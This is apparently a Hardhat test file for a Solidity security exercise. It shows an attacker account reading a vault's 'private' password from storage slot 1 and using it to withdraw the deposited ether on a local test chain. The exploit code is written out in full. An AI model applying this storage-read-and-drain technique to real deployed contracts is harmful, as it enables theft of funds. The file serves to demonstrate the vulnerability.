const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Private Access", () => {
  let deployer, attacker;

  beforeEach(async function () {
    [deployer, attacker] = await ethers.getSigners();
    const Vault = await ethers.getContractFactory("Vault", deployer);
    this.vault = await Vault.deploy(ethers.utils.formatBytes32String("abc@123"));
    await this.vault.deposit({value: ethers.utils.parseEther("1000")});
  });
  describe("Test the vault", () => {
    it("Should return owner of the vault", async function () {
      expect(await this.vault.owner()).to.eq(deployer.address);
    });

    it("Should be able to retrieve private state variables", async function () {
      const initBalanceContract =  await ethers.provider.getBalance(this.vault.address);
      const initBalanceAttacker =  await ethers.provider.getBalance(attacker.address);
      console.log("Init Contract Balance = ", ethers.utils.formatEther(initBalanceContract));
      console.log("Init Attacker Balance = ", ethers.utils.formatEther(initBalanceAttacker));

      const get_password_bytes =  await ethers.provider.getStorageAt(this.vault.address, 1);//vi tri so 1 do vi tri so 0 se la cua _owner trong contract Ownable
      const get_password_string =  await ethers.utils.parseBytes32String(get_password_bytes);
      console.log("Password = ", get_password_string);

      console.log("=================ATTACKING================");
      await this.vault.connect(attacker).widthdraw(get_password_bytes);

      const currentBalanceContract =  await ethers.provider.getBalance(this.vault.address);
      const currentBalanceAttacker =  await ethers.provider.getBalance(attacker.address);
      console.log("Now Contract Balance = ", ethers.utils.formatEther(currentBalanceContract));
      console.log("Now Attacker Balance = ", ethers.utils.formatEther(currentBalanceAttacker));

    });

   
  });
})